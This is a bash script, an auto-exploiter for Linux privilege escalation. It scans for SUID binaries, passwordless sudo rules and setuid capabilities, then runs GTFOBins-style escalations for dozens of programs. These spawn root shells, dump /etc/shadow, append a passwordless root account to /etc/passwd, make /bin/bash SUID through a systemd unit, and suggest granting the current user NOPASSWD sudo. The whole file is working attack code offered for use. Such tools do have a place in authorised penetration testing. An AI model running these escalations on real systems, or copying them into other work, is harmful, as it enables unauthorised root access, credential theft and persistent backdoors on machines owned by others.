#!/bin/bash
# gtfo-auto.sh - Extended SUID + Sudo GTFOBin Scanner & Auto-Exploiter

SHELL_CMD="/bin/sh"

echo "================================================"
echo "  gtfo-auto.sh - GTFOBin Auto-Exploiter"
echo "================================================"

# ─────────────────────────────────────────────
# SECTION 1: SUID BINARY SCANNING
# ─────────────────────────────────────────────

exploit_bin() {
    local bin=$1
    local name=$(basename "$bin")
    local prefix=""

    # If called from sudo section, prefix command with sudo
    if [ "$2" == "sudo" ]; then
        prefix="sudo"
    fi

    case $name in
        bash|sh|dash)
            echo "[+] Exploiting $bin"
            $prefix $bin -p
            ;;
        perl)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'
            ;;
        python|python2|python3|python3.*)
            echo "[+] Exploiting $bin"
            $prefix $bin -c 'import os; os.setuid(0); os.system("/bin/sh")'
            ;;
        find)
            echo "[+] Exploiting $bin"
            $prefix $bin . -exec /bin/sh \;
            ;;
        vim|vi|view|vimdiff)
            echo "[+] Exploiting $bin"
            $prefix $bin -c ':!/bin/sh'
            ;;
        nmap)
            echo "[+] Exploiting $bin"
            echo 'os.execute("/bin/sh")' > /tmp/nmap_shell.nse
            $prefix $bin --script=/tmp/nmap_shell.nse
            ;;
        less|more)
            echo "[+] Exploiting $bin"
            echo "[!] Run: $prefix $bin /etc/passwd — then type !/bin/sh"
            $prefix $bin /etc/passwd
            ;;
        awk|gawk|mawk)
            echo "[+] Exploiting $bin"
            $prefix $bin 'BEGIN {system("/bin/sh")}'
            ;;
        man)
            echo "[+] Exploiting $bin"
            echo "[!] Type !/bin/sh at the prompt"
            $prefix $bin man
            ;;
        tclsh|wish)
            echo "[+] Exploiting $bin"
            $prefix $bin <<< 'exec /bin/sh'
            ;;
        ruby)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'exec "/bin/sh"'
            ;;
        lua|lua5.*)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'os.execute("/bin/sh")'
            ;;
        node|nodejs)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
            ;;
        php|php7*|php8*)
            echo "[+] Exploiting $bin"
            $prefix $bin -r 'system("/bin/sh");'
            ;;
        zip)
            echo "[+] Exploiting $bin"
            $prefix $bin /tmp/exploit.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"
            ;;
        tar)
            echo "[+] Exploiting $bin"
            $prefix $bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        cat)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            $prefix $bin /etc/shadow
            ;;
        tee)
            echo "[+] Exploiting $bin"
            echo "root2::0:0:root:/root:/bin/bash" | $prefix $bin -a /etc/passwd
            ;;
        sed)
            echo "[+] Exploiting $bin"
            $prefix $bin -n '1e exec sh' /etc/passwd
            ;;
        ed)
            echo "[+] Exploiting $bin"
            $prefix $bin -s <<< '!/bin/sh'
            ;;
        nano)
            echo "[+] Exploiting $bin"
            echo "[!] Inside nano: Ctrl+R then Ctrl+X, then: reset; sh 1>&0 2>&0"
            $prefix $bin
            ;;
        emacs)
            echo "[+] Exploiting $bin"
            $prefix $bin -Q -nw --eval '(term "/bin/sh")'
            ;;
        xxd)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            $prefix $bin /etc/shadow | xxd -r
            ;;
        base64)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            b64=$($prefix $bin /etc/shadow)
            echo "$b64" | base64 -d
            ;;
        openssl)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            $prefix $bin enc -in /etc/shadow
            ;;
        curl)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            $prefix $bin file:///etc/shadow
            ;;
        wget)
            echo "[+] Exploiting $bin"
            $prefix $bin -O /tmp/shadow_copy file:///etc/shadow
            cat /tmp/shadow_copy
            ;;
        strace)
            echo "[+] Exploiting $bin"
            $prefix $bin -o /dev/null /bin/sh -p
            ;;
        ltrace)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh -p
            ;;
        env)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh -p
            ;;
        taskset)
            echo "[+] Exploiting $bin"
            $prefix $bin 1 /bin/sh -p
            ;;
        nice)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh -p
            ;;
        ionice)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh -p
            ;;
        time)
            echo "[+] Exploiting $bin"
            $prefix $bin /bin/sh -p
            ;;
        timeout)
            echo "[+] Exploiting $bin"
            $prefix $bin 7d /bin/sh -p
            ;;
        watch)
            echo "[+] Exploiting $bin"
            $prefix $bin -x sh -c 'reset; exec sh 1>&0 2>&0'
            ;;
        socat)
            echo "[+] Exploiting $bin"
            $prefix $bin stdin exec:/bin/sh
            ;;
        screen)
            echo "[+] Exploiting $bin"
            echo "[!] Try: $prefix screen -D -m sh -c /bin/sh"
            ;;
        docker)
            echo "[+] Exploiting $bin"
            $prefix $bin run -v /:/mnt --rm -it alpine chroot /mnt sh
            ;;
        git)
            echo "[+] Exploiting $bin"
            PAGER='sh -c "exec sh 0<&1"' $prefix $bin -p help
            ;;
        ftp)
            echo "[+] Exploiting $bin"
            echo "[!] Type !/bin/sh at the ftp prompt"
            $prefix $bin
            ;;
        gdb)
            echo "[+] Exploiting $bin"
            $prefix $bin -nx -ex 'python import os; os.execv("/bin/sh", ["sh"])' -ex quit
            ;;
        mysql)
            echo "[+] Exploiting $bin"
            echo "[!] Try: $prefix mysql -u root --execute='\\! /bin/sh'"
            ;;
        sqlite3)
            echo "[+] Exploiting $bin"
            $prefix $bin /dev/null '.shell /bin/sh'
            ;;
        xargs)
            echo "[+] Exploiting $bin"
            echo | $prefix $bin -I{} /bin/sh -p
            ;;
        cp)
            echo "[+] Exploiting $bin"
            echo "[!] Can overwrite /etc/passwd or /etc/sudoers — manual step required"
            ;;
        mv)
            echo "[+] Exploiting $bin"
            echo "[!] Can replace sensitive files — manual step required"
            ;;
        chmod)
            echo "[+] Exploiting $bin"
            echo "[!] Try: $prefix $bin +s /bin/bash then bash -p"
            ;;
        chown)
            echo "[+] Exploiting $bin"
            echo "[!] Try: $prefix $bin $(whoami) /etc/shadow"
            ;;
        dd)
            echo "[+] Exploiting $bin (reading /etc/shadow)"
            $prefix $bin if=/etc/shadow
            ;;
        scp)
            echo "[+] Exploiting $bin"
            $prefix $bin -S /bin/sh x y
            ;;
        rsync)
            echo "[+] Exploiting $bin"
            $prefix $bin -e 'sh -p -i' 127.0.0.1:/dev/null
            ;;
        zip)
            echo "[+] Exploiting $bin"
            $prefix $bin /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"
            ;;
        unzip)
            echo "[+] Exploiting $bin"
            echo "[!] Limited exploitation — check GTFOBins manually"
            ;;
        make)
            echo "[+] Exploiting $bin"
            $prefix $bin -s --eval=$'x:\n\t-'"/bin/sh"
            ;;
        gcc|cc)
            echo "[+] Exploiting $bin"
            $prefix $bin -wrapper /bin/sh,-s .
            ;;
        as)
            echo "[+] Exploiting $bin"
            $prefix $bin --traditional -o /dev/null /dev/null --target=help \
                --debug-prefix-map="a=/bin/sh -p #"
            ;;
        journalctl)
            echo "[+] Exploiting $bin"
            echo "[!] If output is paged, type !/bin/sh"
            $prefix $bin -n 1
            ;;
        systemctl)
            echo "[+] Exploiting $bin"
            TF=$(mktemp).service
            echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
            $prefix $bin link $TF
            $prefix $bin enable --now $(basename $TF)
            echo "[!] Now run: bash -p"
            ;;
        apt|apt-get)
            echo "[+] Exploiting $bin"
            $prefix $bin update -o APT::Update::Pre-Invoke::=/bin/sh
            ;;
        pip|pip3)
            echo "[+] Exploiting $bin"
            TF=$(mktemp -d)
            echo "import os; os.execl('/bin/sh','sh','-p')" > $TF/setup.py
            $prefix $bin install $TF
            ;;
        puppet)
            echo "[+] Exploiting $bin"
            $prefix $bin apply -e "exec { '/bin/sh -p': }"
            ;;
        ansible|ansible-playbook)
            echo "[+] Exploiting $bin"
            echo "[!] Use a playbook with shell module executing /bin/sh"
            ;;
        knife)
            echo "[+] Exploiting $bin"
            $prefix $bin exec -E 'exec "/bin/sh"'
            ;;
        *)
            echo "[-] $bin — no exploit implemented, check GTFOBins manually"
            ;;
    esac
}

# ─────────────────────────────────────────────
# SECTION 2: SUID SCAN
# ─────────────────────────────────────────────

echo ""
echo "[*] Scanning for SUID binaries..."
echo "------------------------------------------------"
suid_bins=$(find / -perm -4000 -type f 2>/dev/null)

if [ -z "$suid_bins" ]; then
    echo "[-] No SUID binaries found"
else
    for bin in $suid_bins; do
        exploit_bin "$bin" "suid"
    done
fi

# ─────────────────────────────────────────────
# SECTION 3: SUDO -L PARSING
# ─────────────────────────────────────────────

echo ""
echo "[*] Checking sudo privileges..."
echo "------------------------------------------------"

# Check if sudo is available without password first
sudo_output=$(sudo -l 2>/dev/null)

if [ -z "$sudo_output" ]; then
    echo "[-] No sudo privileges found or sudo requires a password"
else
    echo "[*] sudo -l output:"
    echo "$sudo_output"
    echo ""
    echo "[*] Parsing exploitable sudo entries..."
    echo "------------------------------------------------"

    # Extract lines with NOPASSWD
    nopasswd_lines=$(echo "$sudo_output" | grep -i "NOPASSWD" | grep -v "^#")

    if [ -z "$nopasswd_lines" ]; then
        echo "[-] No NOPASSWD entries found"
    else
        while IFS= read -r line; do
            # Extract the binary path from the sudo rule
            # Handles formats like: (root) NOPASSWD: /usr/bin/vim
            bin_path=$(echo "$line" | grep -oP '(?<=NOPASSWD:\s{0,10})/[^\s,]+' | head -1)

            if [ -n "$bin_path" ]; then
                bin_name=$(basename "$bin_path")
                echo "[+] Found NOPASSWD sudo entry: $bin_path"

                # Check for wildcard/ALL
                if echo "$line" | grep -q "ALL" && echo "$line" | grep -q "NOPASSWD.*ALL"; then
                    echo "[!!!] FULL SUDO ACCESS — running: sudo /bin/sh"
                    sudo /bin/sh
                    break
                fi

                # Check if binary exists
                if [ ! -f "$bin_path" ]; then
                    echo "[!] Binary $bin_path not found on disk, skipping"
                    continue
                fi

                echo "[*] Attempting to exploit: $bin_path via sudo"
                exploit_bin "$bin_path" "sudo"
            fi
        done <<< "$nopasswd_lines"
    fi

    # Also flag any writable sudo rule files
    echo ""
    echo "[*] Checking for writable sudoers files..."
    for f in /etc/sudoers /etc/sudoers.d/*; do
        if [ -w "$f" ] 2>/dev/null; then
            echo "[!!!] WRITABLE SUDOERS FILE: $f"
            echo "[!!!] Try: echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> $f"
        fi
    done
fi

# ─────────────────────────────────────────────
# SECTION 4: BONUS CHECKS
# ─────────────────────────────────────────────

echo ""
echo "[*] Running bonus privilege escalation checks..."
echo "------------------------------------------------"

# World-writable files owned by root
echo "[*] World-writable files owned by root:"
find / -writable -user root -type f 2>/dev/null | grep -v proc | grep -v sys

# Check for writable /etc/passwd
if [ -w /etc/passwd ]; then
    echo "[!!!] /etc/passwd is WRITABLE!"
    echo "[!!!] Try: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned"
fi

# Capabilities
echo ""
echo "[*] Checking binary capabilities..."
getcap -r / 2>/dev/null | while read -r cap_line; do
    echo "[+] Capability found: $cap_line"
    cap_bin=$(echo "$cap_line" | awk '{print $1}')
    cap_name=$(basename "$cap_bin")
    case $cap_name in
        python*|perl|ruby|node)
            echo "[!!!] Exploitable cap_setuid binary: $cap_bin"
            $cap_bin -c 'import os; os.setuid(0); os.system("/bin/sh")' 2>/dev/null || \
            $cap_bin -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";' 2>/dev/null || \
            $cap_bin -e 'exec "/bin/sh"' 2>/dev/null
            ;;
        vim|vi)
            echo "[!!!] Exploitable cap_setuid vim: $cap_bin"
            $cap_bin -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
            ;;
        *)
            echo "[!] Check $cap_bin manually on GTFOBins"
            ;;
    esac
done

echo ""
echo "[*] Scan complete."
echo "================================================"
